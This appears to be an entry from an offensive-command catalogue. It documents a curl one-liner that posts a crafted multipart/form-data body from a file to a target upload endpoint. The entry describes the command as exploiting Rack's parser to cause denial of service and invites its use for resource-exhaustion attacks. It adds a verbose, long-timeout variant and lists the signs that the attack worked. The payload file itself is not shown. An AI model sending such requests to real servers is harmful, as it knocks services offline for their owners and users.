---
id: cmd-curl-multipart-001
data: >-
  curl -X POST -H "Content-Type: multipart/form-data; boundary=boundary123"
  --data-binary @dos_request.txt https://target.com/upload
tags:
  - dos
  - http
  - curl
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:37.182Z'
verified: false
validated: true
submitted: true
---
# curl-multipart-dos

## Command

```bash
curl -X POST -H "Content-Type: multipart/form-data; boundary=boundary123" --data-binary @dos_request.txt https://target.com/upload
```

## Description

This command sends a crafted multipart/form-data POST request to a target endpoint using curl, exploiting Rack's parser to cause DoS via excessive parts processing. Use it to deliver payloads for resource exhaustion attacks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies POST method | Yes |
| `-H "Content-Type: ..."` | Sets multipart header with boundary | Yes |
| `--data-binary @file` | Reads body from file without modification | Yes |
| `https://target.com/upload` | Target endpoint URL | Yes |

## Examples

### Basic Usage

```bash
curl -X POST -H "Content-Type: multipart/form-data; boundary=boundary123" --data-binary @dos_request.txt https://target.com/upload
```

### Advanced Usage

```bash
curl -X POST -H "Content-Type: multipart/form-data; boundary=boundary123" --data-binary @dos_request.txt -v https://target.com/upload --max-time 300
```

Adds verbose output and timeout for monitoring slow responses.

## Expected Output

Server response may be delayed (minutes) or timeout due to exhaustion; look for HTTP 200/500 with slow parsing or connection reset.

## Related

- [[Related Procedure|Send-DoS-Request-to-Trigger-Exhaustion]]
